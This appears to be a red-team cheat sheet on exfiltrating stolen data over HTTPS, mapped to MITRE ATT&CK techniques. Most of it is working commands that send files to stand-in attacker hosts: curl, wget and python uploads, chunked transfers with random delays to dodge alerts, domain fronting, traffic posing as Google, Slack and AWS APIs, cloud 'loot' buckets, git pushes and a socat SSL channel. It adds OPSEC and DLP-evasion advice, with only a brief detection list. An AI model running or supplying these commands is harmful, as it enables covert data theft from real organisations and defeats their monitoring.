# HTTPS Exfiltration (T1048.002)

## Overview
HTTPS exfiltration leverages encrypted web traffic (port 443) to transfer stolen data.
Since HTTPS is universally allowed through firewalls and the payload is encrypted,
it blends naturally with legitimate web browsing and API traffic. This makes it one
of the most practical and commonly used exfiltration methods.

## Advantages
- Port 443 is almost never blocked
- TLS encryption prevents content inspection (unless TLS interception is deployed)
- Blends with normal web traffic patterns
- High bandwidth available
- Many legitimate services to masquerade as (cloud APIs, CDNs, SaaS)

## Basic HTTPS POST Exfiltration
```bash
# Simple file upload via POST
curl -X POST -H "Content-Type: application/octet-stream" \
     -d @data.enc https://attacker.com/api/upload

# Multipart form upload (mimics normal file upload)
curl -X POST -F "file=@data.enc" -F "name=report.pdf" \
     https://attacker.com/upload

# Using wget
wget --post-file=data.enc https://attacker.com/api/upload -O /dev/null -q

# Using python requests
python3 -c "
import requests
with open('data.enc','rb') as f:
    requests.post('https://attacker.com/upload', files={'file': f})
"
```

## Chunked Transfer (T1030)
Split large files and send with delays to avoid triggering volume alerts:
```bash
# Split encrypted file into 512KB chunks
split -b 512k data.enc chunk_

# Upload each chunk with random delays
for chunk in chunk_*; do
    curl -s -X POST \
         -H "X-Chunk-Name: $chunk" \
         -H "X-Session-ID: $(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen)" \
         -d @"$chunk" \
         https://attacker.com/api/chunks/"$chunk"
    DELAY=$((RANDOM % 60 + 30))  # 30-90 second delay
    sleep $DELAY
done

# Signal completion
curl -s -X POST https://attacker.com/api/chunks/complete
```

## Domain Fronting
Route traffic through legitimate CDN domains to hide the true destination:
```bash
# Use a legitimate CDN domain as the SNI, route to attacker backend
curl -X POST -d @data.enc \
     -H "Host: attacker-app.azurewebsites.net" \
     https://legitimate-cdn.example.com/upload

# Using CloudFront/Azure CDN as fronting domain
curl --resolve "legit.cloudfront.net:443:ATTACKER_IP" \
     -H "Host: attacker.cloudfront.net" \
     https://legit.cloudfront.net/upload -d @data.enc
```

## Masquerading as Legitimate APIs
```bash
# Disguise as Google API traffic
curl -X POST -d @data.enc \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer fake_token" \
     https://attacker.com/v1/analytics/collect

# Disguise as Slack webhook
curl -X POST -d "{\"text\":\"$(base64 -w 0 data.enc)\"}" \
     -H "Content-Type: application/json" \
     https://hooks.slack.com/services/ATTACKER/WEBHOOK/TOKEN

# Disguise as AWS API call
curl -X PUT -d @data.enc \
     -H "x-amz-content-sha256: UNSIGNED-PAYLOAD" \
     https://attacker-bucket.s3.amazonaws.com/data.enc
```

## Cloud Storage Exfiltration (T1567.002)
```bash
# AWS S3
aws s3 cp data.enc s3://attacker-bucket/loot/$(hostname)_$(date +%s).enc

# Azure Blob Storage
az storage blob upload --file data.enc \
    --container-name loot --name "$(hostname).enc" \
    --connection-string "$ATTACKER_CONN_STRING"

# Google Cloud Storage
gsutil cp data.enc gs://attacker-bucket/loot/

# Dropbox API
curl -X POST https://content.dropboxapi.com/2/files/upload \
     --header "Authorization: Bearer $TOKEN" \
     --header "Dropbox-API-Arg: {\"path\":\"/loot/data.enc\"}" \
     --header "Content-Type: application/octet-stream" \
     --data-binary @data.enc
```

## Code Repository Exfiltration (T1567.001)
```bash
# GitHub — push to private repo
git init /tmp/exfil && cd /tmp/exfil
cp /path/to/data.enc .
git add . && git commit -m "Initial commit"
git remote add origin https://$TOKEN@github.com/attacker/exfil-repo.git
git push -u origin main

# GitLab — push via API
curl --header "PRIVATE-TOKEN: $TOKEN" \
     --form "file=@data.enc" \
     "https://gitlab.com/api/v4/projects/$PROJECT_ID/uploads"
```

## HTTPS Reverse Shell as Exfil Channel
```bash
# Use an established HTTPS reverse shell to transfer files
# On attacker — listener with socat
socat OPENSSL-LISTEN:443,cert=server.pem,fork FILE:/tmp/received.enc,create

# On target — send file through SSL
socat -u FILE:data.enc OPENSSL:attacker.com:443,verify=0
```

## Rate Limiting Strategies
- **Time-based:** Random sleep between 30s-5min between uploads
- **Size-based:** Keep individual requests under 1MB to avoid DLP triggers
- **Pattern-based:** Vary request timing to avoid periodic patterns
- **Volume-based:** Limit total daily exfil to match normal upload patterns

## TLS Interception Bypass
```bash
# Check for TLS interception (certificate inspection)
openssl s_client -connect attacker.com:443 2>/dev/null | grep "issuer"
# If issuer is corporate CA, TLS is being intercepted

# Use certificate pinning in custom tools
# Use non-standard ports (8443, 8080) if TLS inspection only covers 443
curl -X POST -d @data.enc https://attacker.com:8443/upload
```

## Detection Indicators
- Large outbound POST requests (especially to new/rare domains)
- High frequency of connections to a single external host
- Unusual User-Agent strings
- POST requests to IP addresses (no domain)
- Data uploads outside business hours
- Connections to recently registered domains

## OPSEC Best Practices
- Use aged domains with legitimate-looking content
- Set realistic User-Agent and Referer headers
- Match upload patterns to normal business traffic
- Use legitimate cloud services when possible
- Implement jitter in request timing
- Keep individual request sizes small
- Use HTTPS certificate pinning in custom tools
